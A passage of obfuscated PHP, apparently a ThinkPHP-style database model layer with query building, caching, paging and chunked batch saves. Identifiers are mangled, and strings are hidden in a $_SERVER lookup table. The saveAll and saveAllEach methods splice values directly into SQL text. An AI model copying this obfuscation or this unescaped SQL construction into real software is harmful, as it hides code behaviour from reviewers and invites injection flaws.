($ğ³”ÌÁÇ[12] === $÷Ü¬ÆĞÅ) { if (isset($this->_scope[$ğ³”ÌÁÇ[37]])) { $«Ëğ¼Ï = $this->_scope[$ğ³”ÌÁÇ[37]]; } else { return $this; } } elseif (is_string($÷Ü¬ÆĞÅ)) { $”¥— ó = explode($ğ³”ÌÁÇ[50], $÷Ü¬ÆĞÅ); $«Ëğ¼Ï = array(); foreach ($”¥— ó as $Ù¹Õ ­½) { if (!isset($this->_scope[$Ù¹Õ ­½])) { continue; } $«Ëğ¼Ï = array_merge($«Ëğ¼Ï, $this->_scope[$Ù¹Õ ­½]); } if (!empty($òŞ½¡Ä) && is_array($òŞ½¡Ä)) { $«Ëğ¼Ï = array_merge($«Ëğ¼Ï, $òŞ½¡Ä); } } elseif (is_array($÷Ü¬ÆĞÅ)) { $«Ëğ¼Ï = $÷Ü¬ÆĞÅ; } if (is_array($«Ëğ¼Ï) && !empty($«Ëğ¼Ï)) { $this->options = array_merge($this->options, array_change_key_case($«Ëğ¼Ï)); } return $this; } public function where($¬°İ·õ‹, $åé¥ÅáŠ = null) { $ÃáùéÕÁ =& $_SERVER[”ú…±Ú¥]; if (!is_null($åé¥ÅáŠ) && is_string($¬°İ·õ‹)) { if (!is_array($åé¥ÅáŠ)) { $åé¥ÅáŠ = func_get_args(); array_shift($åé¥ÅáŠ); } $åé¥ÅáŠ = array_map(array($this->db, $ÃáùéÕÁ[381]), $åé¥ÅáŠ); $¬°İ·õ‹ = vsprintf($¬°İ·õ‹, $åé¥ÅáŠ); } elseif (is_object($¬°İ·õ‹)) { $¬°İ·õ‹ = get_object_vars($¬°İ·õ‹); } elseif (is_array($¬°İ·õ‹)) { foreach ($¬°İ·õ‹ as $ĞêæÔİ => $ñ‡¬Ôê™) { if ((is_numeric($ĞêæÔİ) || !$ĞêæÔİ) && is_string($ñ‡¬Ôê™)) { if (strpos($ñ‡¬Ôê™, $ÃáùéÕÁ[388]) === 0) { continue; } think_trace($ÃáùéÕÁ[389], $ÃáùéÕÁ[12], $ÃáùéÕÁ[49]); die; } } } if (is_string($¬°İ·õ‹) && $ÃáùéÕÁ[12] != $¬°İ·õ‹) { $ŠÄé²Ôó = array(); $ŠÄé²Ôó[$ÃáùéÕÁ[390]] = $¬°İ·õ‹; $¬°İ·õ‹ = $ŠÄé²Ôó; } if (isset($this->options[$ÃáùéÕÁ[313]])) { $this->options[$ÃáùéÕÁ[313]] = array_merge($this->options[$ÃáùéÕÁ[313]], $¬°İ·õ‹); } else { $this->options[$ÃáùéÕÁ[313]] = $¬°İ·õ‹; } return $this; } public function limit($¬î³äçˆ, $ªÏÎñõ× = null) { $óÅ„Á¡Œ =& $_SERVER[”ú…±Ú¥]; $this->options[$óÅ„Á¡Œ[330]] = is_null($ªÏÎñõ×) ? $¬î³äçˆ : $¬î³äçˆ . $óÅ„Á¡Œ[50] . $ªÏÎñõ×; return $this; } public function page($µ¹ìÈÌÖ, $Ø–™•ÜÃ = null) { $³ï…Ì¾ =& $_SERVER[”ú…±Ú¥]; $this->options[$³ï…Ì¾[391]] = is_null($Ø–™•ÜÃ) ? $µ¹ìÈÌÖ : $µ¹ìÈÌÖ . $³ï…Ì¾[50] . $Ø–™•ÜÃ; return $this; } public function comment($åÀœÄÜ¡) { $this->options[$_SERVER[”ú…±Ú¥][392]] = $åÀœÄÜ¡; return $this; } public function setProperty($ƒÏ»˜ˆ, $ç‘Òš‡) { if (property_exists($this, $ƒÏ»˜ˆ)) { $this->{$ƒÏ»˜ˆ} = $ç‘Òš‡; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\x66\x79\x54\151\155\x65", "\x74\151\155\145", "\x69\x6e\x73\x65\162\x74\x2c\x75\160\144\141\164\145", "\x66\165\x6e\143\164\151\157\x6e"), array("\x63\162\145\x61\164\x65\x54\151\155\x65", "\164\x69\155\145", "\x69\x6e\163\x65\x72\164", "\x66\165\156\x63\164\151\x6f\x6e")); public function setDataAuto($şš¼À–Ã) { $this->dataAuto = $şš¼À–Ã; } public function __construct($÷Ş½¬©µ = '', $•åˆÉÃÎ = '', $–ıƒĞÍÀ = '') { parent::__construct($÷Ş½¬©µ, $•åˆÉÃÎ, $–ıƒĞÍÀ); } protected $tableMeta = array(); protected function _beforeInsert(&$¤ùùÙö, $™£§şš) { $©Ä¥éß =& $_SERVER[”ú…±Ú¥]; if (!$this->checkDataAutoHas($©Ä¥éß[393])) { return; } $this->dataBeforeFilter($¤ùùÙö, $©Ä¥éß[393]); } protected function _beforeUpdate(&$˜†ÇŸÀ¬, $ªœÜ¡ğ³) { $ÏŞ¹ËíØ =& $_SERVER[”ú…±Ú¥]; if (!$this->checkDataAutoHas($ÏŞ¹ËíØ[394])) { return; } $this->dataBeforeFilter($˜†ÇŸÀ¬, $ÏŞ¹ËíØ[394]); } protected function _afterSelect(&$±¡¿ÈÄ, $°á«Ğ×) { if (!is_array($±¡¿ÈÄ)) { return; } if (!$this->checkDataAutoHas($_SERVER[”ú…±Ú¥][395])) { return; } foreach ($±¡¿ÈÄ as &$Ôß¸¥ß¤) { $this->dataAfterFilter($Ôß¸¥ß¤); } unset($Ôß¸¥ß¤); } protected function _afterFind(&$ˆ“šŞÆ›, $²öÃøÆ´) { if (!is_array($ˆ“šŞÆ›)) { return; } if (!$this->checkDataAutoHas($_SERVER[”ú…±Ú¥][395])) { return; } $this->dataAfterFilter($ˆ“šŞÆ›); } public static function textEncode($˜™á¸ûª) { if (!$˜™á¸ûª) { return $˜™á¸ûª; } $‚ÙÑÓ¯‚ = json_encode($˜™á¸ûª); $‚ÙÑÓ¯‚ = preg_replace_callback($_SERVER[”ú…±Ú¥][396], function ($ø«û±îˆ) { return addslashes($ø«û±îˆ[0]); }, $‚ÙÑÓ¯‚); return json_decode($‚ÙÑÓ¯‚); } public static function textDecode($Õ‘­¦’Ú) { $ê¿ÈÑşä =& $_SERVER[”ú…±Ú¥]; $êÜë›ŞÒ = json_encode($Õ‘­¦’Ú); $êÜë›ŞÒ = preg_replace_callback($ê¿ÈÑşä[397], function ($Î¼ë¤Ôø) { return $_SERVER[”ú…±Ú¥][97]; }, $êÜë›ŞÒ); return json_decode($êÜë›ŞÒ); } public function setAutoIncrement($–¹¯ÓØŸ) { $•“‹á…İ = array($this->getPk() => $–¹¯ÓØŸ); $öÜéè¤ = $this->data($•“‹á…İ)->add(); if ($öÜéè¤) { $this->delete($öÜéè¤); } } public function getAutoIncrement() { $Ü»‘İ™ = $this->getTableName(); $ğÂÏê©š = $this->max($this->getPk()); $øÀéÄ˜ = $this->query("\163\150\x6f\x77\40\164\x61\142\x6c\x65\x20\x73\164\x61\x74\165\x73\40\167\150\x65\162\145\40\x4e\x61\155\145\75\47{$Ü»‘İ™}\47"); $£î•‡ã“ = $øÀéÄ˜[0][$_SERVER[”ú…±Ú¥][398]]; $÷ÂÌÎƒô = max($ğÂÏê©š, $£î•‡ã“); return $÷ÂÌÎƒô; } protected function _callBefore($‹ĞÙùù›, $Áˆ²‹Ğº) { return $this->cacheCallCheck($‹ĞÙùù›, $Áˆ²‹Ğº, !1); } protected function _callAfter($Ç‡Ñ¸Í, $‹å¸Ëºó) { return $this->cacheCallCheck($Ç‡Ñ¸Í, $‹å¸Ëºó, !0); } protected function cacheFunctionAlias($“óòàİï) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÈÆ»ìÂ, $«™æËÖç, $Šò¸•ÂÎ = false) { $¬„‚µØ¶ = $this->cacheFunctionAlias($«™æËÖç); if (!$¬„‚µØ¶) { return; } foreach ($¬„‚µØ¶ as $î¼¨¦æö => $¸ÛİÒ˜ë) { $Ó”„ûµğ = $¸ÛİÒ˜ë[0]; $è³Úõá = explode($_SERVER[”ú…±Ú¥][50], $¸ÛİÒ˜ë[1]); if ($ÈÆ»ìÂ == $î¼¨¦æö) { return $this->cacheFunctionGet($î¼¨¦æö, $Ó”„ûµğ); } if ($Šò¸•ÂÎ && in_array($ÈÆ»ìÂ, $è³Úõá)) { $this->cacheFunctionClear($î¼¨¦æö, $Ó”„ûµğ); } } } public function cacheFunctionGet($ä³š¨Ø, $ÃòĞ¥¥Ã) { $ö¬Ü›†¾ = $this->cacheKeyMake($ä³š¨Ø, $ÃòĞ¥¥Ã); $²ñÓø¢Á = Cache::get($ö¬Ü›†¾); if (!is_array($²ñÓø¢Á)) { $²ñÓø¢Á = call_user_func_array(array($this, $ä³š¨Ø), array($ÃòĞ¥¥Ã, !0)); Cache::set($ö¬Ü›†¾, $²ñÓø¢Á); } return $²ñÓø¢Á; } public function cacheFunctionClear($¢’ëëÚ, $’ÏŠØ©š) { $ª«à×â = $’ÏŠØ©š; if (!is_array($’ÏŠØ©š)) { $ª«à×â = array($’ÏŠØ©š); } foreach ($ª«à×â as $“ø¾ëÇ‹) { $ë›½Ëá» = $this->cacheKeyMake($¢’ëëÚ, $“ø¾ëÇ‹); Cache::remove($ë›½Ëá»); } } private function cacheKeyMake($ô™¬˜À, $Éã„î‡İ) { $ ¥ç–„ =& $_SERVER[”ú…±Ú¥]; return get_class($this) . $ ¥ç–„[11] . $ô™¬˜À . $ ¥ç–„[399] . $Éã„î‡İ; } protected function selectPageReset() { $ĞÂ“®¸‘ =& $_SERVER[”ú…±Ú¥]; if (isset($GLOBALS[$ĞÂ“®¸‘[400]])) { return; } $GLOBALS[$ĞÂ“®¸‘[400]] = isset($GLOBALS[$ĞÂ“®¸‘[7]][$ĞÂ“®¸‘[401]]) ? $GLOBALS[$ĞÂ“®¸‘[7]][$ĞÂ“®¸‘[401]] : !1; $GLOBALS[$ĞÂ“®¸‘[402]] = isset($GLOBALS[$ĞÂ“®¸‘[7]][$ĞÂ“®¸‘[391]]) ? $GLOBALS[$ĞÂ“®¸‘[7]][$ĞÂ“®¸‘[391]] : !1; $GLOBALS[$ĞÂ“®¸‘[7]][$ĞÂ“®¸‘[401]] = !1; $GLOBALS[$ĞÂ“®¸‘[7]][$ĞÂ“®¸‘[391]] = !1; } protected function selectPageRestore() { $èšÏ×–¡ =& $_SERVER[”ú…±Ú¥]; if (!isset($GLOBALS[$èšÏ×–¡[400]])) { return; } $GLOBALS[$èšÏ×–¡[7]][$èšÏ×–¡[401]] = $GLOBALS[$èšÏ×–¡[400]]; $GLOBALS[$èšÏ×–¡[7]][$èšÏ×–¡[391]] = $GLOBALS[$èšÏ×–¡[402]]; if ($GLOBALS[$èšÏ×–¡[7]][$èšÏ×–¡[401]] === !1) { unset($GLOBALS[$èšÏ×–¡[7]][$èšÏ×–¡[401]]); } if ($GLOBALS[$èšÏ×–¡[7]][$èšÏ×–¡[391]] === !1) { unset($GLOBALS[$èšÏ×–¡[7]][$èšÏ×–¡[391]]); } unset($GLOBALS[$èšÏ×–¡[400]]); unset($GLOBALS[$èšÏ×–¡[402]]); } protected function selectPage($ˆ¨è¢’— = 200, $å‰‚çµÂ = 1) { $¢°é·í× =& $_SERVER[”ú…±Ú¥]; global $in; $ÒöŠ¾Áà = $this->optionsValue(); $“ºƒËóÀ = 50000; $ˆ¨è¢’— = isset($in[$¢°é·í×[401]]) && $in[$¢°é·í×[401]] ? $in[$¢°é·í×[401]] : $ˆ¨è¢’—; if ($ˆ¨è¢’— === -1) { $in[$¢°é·í×[401]] = !1; $“ºƒËóÀ = 100000000; $ˆ¨è¢’— = $“ºƒËóÀ; } $˜‘›ü¹µ = $ÒöŠ¾Áà; $˜‘›ü¹µ[$¢°é·í×[403]] = array(); $ˆ¨è¢’— = intval($ˆ¨è¢’—); $ˆ¨è¢’— = $ˆ¨è¢’— <= 5 ? 5 : ($ˆ¨è¢’— >= $“ºƒËóÀ ? $“ºƒËóÀ : $ˆ¨è¢’—); $å‰‚çµÂ = intval(isset($in[$¢°é·í×[391]]) && $in[$¢°é·í×[391]] ? $in[$¢°é·í×[391]] : $å‰‚çµÂ); $å‰‚çµÂ = $å‰‚çµÂ <= 1 ? 1 : $å‰‚çµÂ; $÷òäŠ‰‹ = array(); $ÈÎº…» = 1; if ($å‰‚çµÂ == 1 && $ÈÎº…») { $this->optionsValue($ÒöŠ¾Áà); $÷òäŠ‰‹ = $this->page($å‰‚çµÂ, $ˆ¨è¢’—)->select(); $¶Ù²¯ £ = is_array($÷òäŠ‰‹) ? count($÷òäŠ‰‹) : 0; if ($¶Ù²¯ £ < $ˆ¨è¢’—) { $õÂ€‹¬Â = 1; } else { $this->optionsValue($˜‘›ü¹µ); $¶Ù²¯ £ = intval($this->count()); $õÂ€‹¬Â = ceil($¶Ù²¯ £ / $ˆ¨è¢’—); } } else { $this->optionsValue($˜‘›ü¹µ); $¶Ù²¯ £ = intval($this->count()); $õÂ€‹¬Â = ceil($¶Ù²¯ £ / $ˆ¨è¢’—); $å‰‚çµÂ = $å‰‚çµÂ >= $õÂ€‹¬Â ? $õÂ€‹¬Â : $å‰‚çµÂ; $this->optionsValue($ÒöŠ¾Áà); $÷òäŠ‰‹ = $this->page($å‰‚çµÂ, $ˆ¨è¢’—)->select(); } if (!is_array($÷òäŠ‰‹)) { $÷òäŠ‰‹ = array(); } if ($õÂ€‹¬Â == 1) { $¶Ù²¯ £ = count($÷òäŠ‰‹); } $„èßş•Ô = array($¢°é·í×[404] => array($¢°é·í×[405] => $¶Ù²¯ £, $¢°é·í×[401] => $ˆ¨è¢’—, $¢°é·í×[391] => $å‰‚çµÂ, $¢°é·í×[406] => $õÂ€‹¬Â), $¢°é·í×[407] => $÷òäŠ‰‹); return $„èßş•Ô; } protected function checkLength($É÷áÊ×¿, $˜Ùäƒ°¢ = 0, $½ˆ›€½ = '') { $ä†ã‡‰ =& $_SERVER[”ú…±Ú¥]; $˜Ùäƒ°¢ = $˜Ùäƒ°¢ ? $˜Ùäƒ°¢ : 65536; if (!$É÷áÊ×¿ || strlen($É÷áÊ×¿) < $˜Ùäƒ°¢) { return; } $½ˆ›€½ = $½ˆ›€½ ? $½ˆ›€½ . $ä†ã‡‰[71] : $ä†ã‡‰[12]; show_json($½ˆ›€½ . LNG($ä†ã‡‰[408]) . "\50{$˜Ùäƒ°¢}\51", !1); } protected function metaSet($›Êæ„²Õ, $œ˜ìÓ…¹ = null, $›õµÂ¨° = null) { $—¨•ó‰Ğ =& $_SERVER[”ú…±Ú¥]; if (!$this->tableMeta || !$›Êæ„²Õ) { return !1; } $ÇèÀû„… = $this->tableMeta[$—¨•ó‰Ğ[409]]; $’õ  = $this->tableMeta[$—¨•ó‰Ğ[410]]; $ŠÖüÊÏ = Model($’õ ); $Ä¦µÙŒ¶ = array($ÇèÀû„… => $›Êæ„²Õ, $—¨•ó‰Ğ[411] => $œ˜ìÓ…¹); if (is_null($œ˜ìÓ…¹)) { return $ŠÖüÊÏ->where(array($ÇèÀû„… => $›Êæ„²Õ))->delete(); } if (is_null($›õµÂ¨°) && is_string($œ˜ìÓ…¹)) { return $ŠÖüÊÏ->where($Ä¦µÙŒ¶)->delete(); } $àÃÜ¬†¥ = is_array($œ˜ìÓ…¹) ? $œ˜ìÓ…¹ : array(); if (is_string($œ˜ìÓ…¹)) { $àÃÜ¬†¥[$œ˜ìÓ…¹] = $›õµÂ¨°; } $ºŠıŞ“é = array(); foreach ($àÃÜ¬†¥ as $Œ¤·’ÏĞ => $õÄ¶ä§») { if (is_null($õÄ¶ä§») && is_string($Œ¤·’ÏĞ)) { $ŠÖüÊÏ->where(array($ÇèÀû„… => $›Êæ„²Õ, $—¨•ó‰Ğ[411] => $Œ¤·’ÏĞ))->delete(); continue; } $this->checkLength($õÄ¶ä§», !1, $’õ  . $—¨•ó‰Ğ[4] . $Œ¤·’ÏĞ); $ºŠıŞ“é[] = array($ÇèÀû„… => $›Êæ„²Õ, $—¨•ó‰Ğ[94] => $Œ¤·’ÏĞ, $—¨•ó‰Ğ[412] => $õÄ¶ä§»); } $Áı¡€„¸ = $—¨•ó‰Ğ[413] . $’õ ; CacheLock::lock($Áı¡€„¸); $ŠÖüÊÏ->where(array($ÇèÀû„… => $›Êæ„²Õ))->addAll($ºŠıŞ“é, array(), !0); CacheLock::unlock($Áı¡€„¸); return !0; } public function metaGet($°À¬Ûß´, $ÙÈâÊø‡ = false) { $ıÈ‚ §˜ =& $_SERVER[”ú…±Ú¥]; if (!$this->tableMeta) { return array(); } $¾´ü‡£ = $this->tableMeta[$ıÈ‚ §˜[409]]; $î˜ëˆÀ = Model($this->tableMeta[$ıÈ‚ §˜[410]]); if ($ÙÈâÊø‡) { $Ñ±ÂÉÁ = array($¾´ü‡£ => $°À¬Ûß´, $ıÈ‚ §˜[94] => $ÙÈâÊø‡); return $î˜ëˆÀ->where($Ñ±ÂÉÁ)->getField($ıÈ‚ §˜[412]); } $Ñ±ÂÉÁ = array($¾´ü‡£ => $°À¬Ûß´); $èş±€¹• = $î˜ëˆÀ->field($ıÈ‚ §˜[414])->where($Ñ±ÂÉÁ)->select(); $èş±€¹• = array_to_keyvalue($èş±€¹•, $ıÈ‚ §˜[94], $ıÈ‚ §˜[412]); return $èş±€¹•; } private function checkDataAutoHas($©ÆÊªËá) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $íÈ×ˆêõ) { if (in_array($©ÆÊªËá, explode($_SERVER[”ú…±Ú¥][50], $íÈ×ˆêõ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$Ş¡÷Ãğ‰, $úõÕ’õÔ) { $¥É””Ì¿ =& $_SERVER[”ú…±Ú¥]; if (!is_array($Ş¡÷Ãğ‰)) { return; } foreach ($this->dataAuto as $É¨İ€) { $±¨ŞÂÅÀ = $É¨İ€[0]; if (!in_array($úõÕ’õÔ, explode($¥É””Ì¿[50], $É¨İ€[2]))) { continue; } switch (trim($É¨İ€[3])) { case $¥É””Ì¿[359]: case $¥É””Ì¿[360]: $ÍÌèÙÇ = $É¨İ€[1]; $×ÍÌêã™ = isset($É¨İ€[4]) ? (array) $É¨İ€[4] : array(); if ($ÍÌèÙÇ == $¥É””Ì¿[180] && array_key_exists($±¨ŞÂÅÀ, $Ş¡÷Ãğ‰)) { if (!$Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]) { unset($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]); } break; } if (isset($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ])) { array_unshift($×ÍÌêã™, $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]); } if ($¥É””Ì¿[359] == $É¨İ€[3]) { $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ] = call_user_func_array($ÍÌèÙÇ, $×ÍÌêã™); } else { $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ] = call_user_func_array(array(&$this, $ÍÌèÙÇ), $×ÍÌêã™); } break; case $¥É””Ì¿[308]: if (isset($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]) && $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]) { $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ] = call_user_func_array(array(&$this, $É¨İ€[1]), array($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ])); } break; case $¥É””Ì¿[311]: $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ] = $Ş¡÷Ãğ‰[$É¨İ€[1]]; break; case $¥É””Ì¿[332]: if (isset($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]) && !is_string($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ])) { $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ] = json_encode_force($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]); } break; case $¥É””Ì¿[361]: if ($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ] === $¥É””Ì¿[12]) { unset($Ş¡÷Ãğ‰[$±¨ŞÂÅÀ]); } break; case $¥É””Ì¿[362]: $Ş¡÷Ãğ‰[$±¨ŞÂÅÀ] = $É¨İ€[1]; default: break; } } if ($úõÕ’õÔ == $¥É””Ì¿[393]) { $®†Õé¸Ù = strtolower($this->db->getDbType()); if (strpos($®†Õé¸Ù, $¥É””Ì¿[13]) !== 0) { return; } $­Şá·ïĞ = $this->field(!0)->fields; $–Õ¦İ€€ = $­Şá·ïĞ[$¥É””Ì¿[290]]; if (isset($­Şá·ïĞ[$¥É””Ì¿[289]])) { unset($–Õ¦İ€€[$­Şá·ïĞ[$¥É””Ì¿[289]]]); } foreach ($–Õ¦İ€€ as $¾š€òí => $úõÕ’õÔ) { if (!isset($Ş¡÷Ãğ‰[$¾š€òí])) { $Ş¡÷Ãğ‰[$¾š€òí] = $¥É””Ì¿[12]; } } } } private function dataAfterFilter(&$¼Îô¾) { $Ÿ…á·ı¤ =& $_SERVER[”ú…±Ú¥]; foreach ($this->dataAuto as $¹Ğ³æÓ) { $ßø„éèÜ = $¹Ğ³æÓ[0]; if (!isset($¼Îô¾[$ßø„éèÜ])) { continue; } if (!in_array($Ÿ…á·ı¤[395], explode($Ÿ…á·ı¤[50], $¹Ğ³æÓ[2]))) { continue; } switch (trim($¹Ğ³æÓ[3])) { case $Ÿ…á·ı¤[359]: case $Ÿ…á·ı¤[360]: $ãïãü³ = isset($¹Ğ³æÓ[4]) ? (array) $¹Ğ³æÓ[4] : array(); array_unshift($ãïãü³, $¼Îô¾[$ßø„éèÜ]); if (isset($¹Ğ³æÓ[4]) && $¹Ğ³æÓ[4] == $Ÿ…á·ı¤[415]) { $ãïãü³ = array($¼Îô¾[$ßø„éèÜ]); } if ($Ÿ…á·ı¤[359] == $¹Ğ³æÓ[3]) { $¼Îô¾[$ßø„éèÜ] = call_user_func_array($¹Ğ³æÓ[1], $ãïãü³); } else { $¼Îô¾[$ßø„éèÜ] = call_user_func_array(array(&$this, $¹Ğ³æÓ[1]), $ãïãü³); } break; case $Ÿ…á·ı¤[308]: if (isset($¼Îô¾[$ßø„éèÜ]) && $¼Îô¾[$ßø„éèÜ]) { $¼Îô¾[$ßø„éèÜ] = call_user_func_array(array(&$this, $¹Ğ³æÓ[1]), array($¼Îô¾[$ßø„éèÜ])); } break; case $Ÿ…á·ı¤[311]: $¼Îô¾[$ßø„éèÜ] = $¼Îô¾[$¹Ğ³æÓ[1]]; break; case $Ÿ…á·ı¤[332]: $Üû²ÈÚî = $¼Îô¾[$ßø„éèÜ]; $¼Îô¾[$ßø„éèÜ] = json_decode($Üû²ÈÚî, !0); if (is_null($¼Îô¾[$ßø„éèÜ])) { $¼Îô¾[$ßø„éèÜ] = $Üû²ÈÚî; } break; case $Ÿ…á·ı¤[361]: if ($¼Îô¾[$ßø„éèÜ] === $Ÿ…á·ı¤[12]) { unset($¼Îô¾[$ßø„éèÜ]); } break; case $Ÿ…á·ı¤[362]: $¼Îô¾[$ßø„éèÜ] = $¹Ğ³æÓ[1]; break; default: break; } } } public function saveAll($ıšôê¬) { $è¼æ¦ê† =& $_SERVER[”ú…±Ú¥]; $´¤ôœºÄ = $this->tablePrefix . $this->tableName; $§¬Ä Îı = self::SQL_WHERE_IN_CHUNK; $ıšôê¬ = is_array($ıšôê¬) ? $ıšôê¬ : array(); $¥÷¾š¥Ó = $è¼æ¦ê†[416]; $ºÌÒ—˜ß = 0; $—¿»°ü• = array(); $•Æñğğ… = count($ıšôê¬); for ($èÆØ¡ú = 0; $èÆØ¡ú < $•Æñğğ…; $èÆØ¡ú++) { $¦÷ı¸Ùö = $ıšôê¬[$èÆØ¡ú]; if (!is_array($¦÷ı¸Ùö) || count($¦÷ı¸Ùö) != 4) { continue; } $ò„İ»œ¡ = "\x55\120\104\101\124\x45\40\x60{$´¤ôœºÄ}\140\x20\123\105\124\40{$¦÷ı¸Ùö[2]}\x20\x3d\40\103\x41\x53\x45\40{$¦÷ı¸Ùö[0]}\40\xa"; if ($ºÌÒ—˜ß == 0) { $¥÷¾š¥Ó = $ò„İ»œ¡; } $—¿»°ü•[] = $è¼æ¦ê†[118] . $¦÷ı¸Ùö[1] . $è¼æ¦ê†[118]; $ºÌÒ—˜ß++; $¥÷¾š¥Ó .= "\x20\127\x48\x45\x4e\x20\47{$¦÷ı¸Ùö[1]}\47\x20\124\110\105\116\x20\47{$¦÷ı¸Ùö[3]}\x27\40\xa"; if ($ºÌÒ—˜ß == $§¬Ä Îı || $èÆØ¡ú == $•Æñğğ… - 1) { $¯òÖ‚¶« = implode($è¼æ¦ê†[50], $—¿»°ü•); $¥÷¾š¥Ó .= "\40\x45\116\104\x20\40\x57\110\105\122\x45\x20{$¦÷ı¸Ùö[0]}\40\111\x4e\40\x28{$¯òÖ‚¶«}\51\x20"; $this->execute($¥÷¾š¥Ó); $ºÌÒ—˜ß = 0; $¥÷¾š¥Ó = $ò„İ»œ¡; $this->chunkEventCheck(count($—¿»°ü•)); $—¿»°ü• = array(); } } $this->chunkEventSet(); } public function saveAllEach($¯ÂöÜÊ¯) { $¾¨ú˜§ =& $_SERVER[”ú…±Ú¥]; $è§Àô‹ˆ = $this->tablePrefix . $this->tableName; foreach ($¯ÂöÜÊ¯ as $¨¬©‡Ø) { if (!is_array($¨¬©‡Ø) || count($¨¬©‡Ø) != 4) { continue; } $ÌñŸ¯Õç = $¨¬©‡Ø[0] . $¾¨ú˜§[417] . $¨¬©‡Ø[1] . $¾¨ú˜§[118]; $Äş£¦è = $¨¬©‡Ø[2] . $¾¨ú˜§[417] . $¨¬©‡Ø[3] . $¾¨ú˜§[118]; $óêÊŒ“ = "\x75\x70\144\141\164\x65\40{$è§Àô‹ˆ}\40\163\x65\164\x20{$Äş£¦è}\x20\x77\x68\x65\x72\145\x20{$ÌñŸ¯Õç}\x3b"; $this->execute($óêÊŒ“); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($‚ıËã‰ = false, $ªÀ¶×–ß = false) { $this->_chunkEvent = $‚ıËã‰; $this->_chunkEventParam = $ªÀ¶×–ß; } private function chunkEventCheck($õ—Ö³†ñ) { if (!$this->_chunkEvent) { return; } $ºÃÓŠ±™ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ºÃÓŠ±™[$_SERVER[”ú…±Ú¥][418]] = $õ—Ö³†ñ; Hook::trigger($this->_chunkEvent, $ºÃÓŠ±™); } public function addAll($¾ÎÓòĞ, $à‚±¸‚û = array(), $ĞŒ¿œ”Ù = false) { $ÖúÚ×Ø =& $_SERVER[”ú…±Ú¥]; ignore_timeout(); $š¾Éæìı = self::SQL_WHERE_IN_CHUNK; if (empty($¾ÎÓòĞ)) { $this->error = think_lang($ÖúÚ×Ø[309]); return !1; } $à‚±¸‚û = $this->_parseOptions($à‚±¸‚û); foreach ($¾ÎÓòĞ as $Èßí»Òô => $æ¦Ô²…©) { $¾ÎÓòĞ[$Èßí»Òô] = $this->_facade($æ¦Ô²…©); $this->_beforeInsert($¾ÎÓòĞ[$Èßí»Òô], $à‚±¸‚û); } if (method_exists($this->db, $ÖúÚ×Ø[310])) { for ($‹±­¡ = 0; $‹±­¡ < count($¾ÎÓòĞ); $‹±­¡ += $š¾Éæìı) { $Òí‚’à› = array_slice($¾ÎÓòĞ, $‹±­¡, $š¾Éæìı); if (!is_array($Òí‚’à›) || count($Òí‚’à›) == 0) { break; } $é¸ƒŒ´ª = $this->db->insertAll($Òí‚’à›, $à‚±¸‚û, $ĞŒ¿œ”Ù); $this->chunkEventCheck(count($Òí‚’à›)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¾ÎÓòĞ as $Èßí»Òô => $æ¦Ô²…©) { $é¸ƒŒ´ª = $this->db->insert($æ¦Ô²…©, $à‚±¸‚û, $ĞŒ¿œ”Ù); } $this->commit(); } if (!1 !== $é¸ƒŒ´ª) { $æ‘ì„ê = $this->getLastInsID(); if ($æ‘ì„ê) { return $æ‘ì„ê; } } return $é¸ƒŒ´ª; } public function save($ôöı¶»² = '', $‚¦º­îš = array()) { $ıÙò¼Ù =& $_SERVER[”ú…±Ú¥]; $ª¾Õ´·ı = self::SQL_WHERE_IN_CHUNK; $ ´ààóÄ = $this->optionsValue(); $§îı¿›¡ = $this->findWhereField($ ´ààóÄ); if (!$§îı¿›¡) { return parent::save($ôöı¶»², $‚¦º­îš); } $ŞÏîˆ¥ê = 0; $Ë©¹ÏÚ = $ ´ààóÄ[$ıÙò¼Ù[313]][$§îı¿›¡][1]; $Ë©¹ÏÚ = is_array($Ë©¹ÏÚ) ? $Ë©¹ÏÚ : array(); $ƒáøŠ®Æ = count($Ë©¹ÏÚ); for ($ØĞ¨¼á = 0; $ØĞ¨¼á < $ƒáøŠ®Æ; $ØĞ¨¼á += $ª¾Õ´·ı) { $¦²îÔšà = array_slice($Ë©¹ÏÚ, $ØĞ¨¼á, $ª¾Õ´·ı); if (!is_array($¦²îÔšà) || count($¦²îÔšà) == 0) { break; } $ ´ààóÄ[$ıÙò¼Ù[313]][$§îı¿›¡][1] = $¦²îÔšà; $this->optionsValue($ ´ààóÄ); $ŞÏîˆ¥ê += parent::save($ôöı¶»², $‚¦º­îš); $this->chunkEventCheck(count($¦²îÔšà)); } $this->chunkEventSet(); return $ŞÏîˆ¥ê; } public function add($¡©óÈ»¡ = '', $Ğ¬Ëºşà = array(), $«Ë§İô = false) { if ($this->addTaskStatus && is_array($¡©óÈ»¡)) { $this->addTaskData[] = $¡©óÈ»¡; return; } return parent::add($¡©óÈ»¡, $Ğ¬Ëºşà, $«Ë§İô); } public function parseWhereLike($Ñ¬»“¬, $¹ğìê€ = '', $òŞàÊ£ = false, &$ëÓëÍï = false) { $ãæ¾‘‚Ó =& $_SERVER[”ú…±Ú¥]; $³¨¢í¡‹ = $GLOBALS[$ãæ¾‘‚Ó[6]][$ãæ¾‘‚Ó[419]]; if (!$³¨¢í¡‹[$ãæ¾‘‚Ó[420]]) { return $Ñ¬»“¬; } if 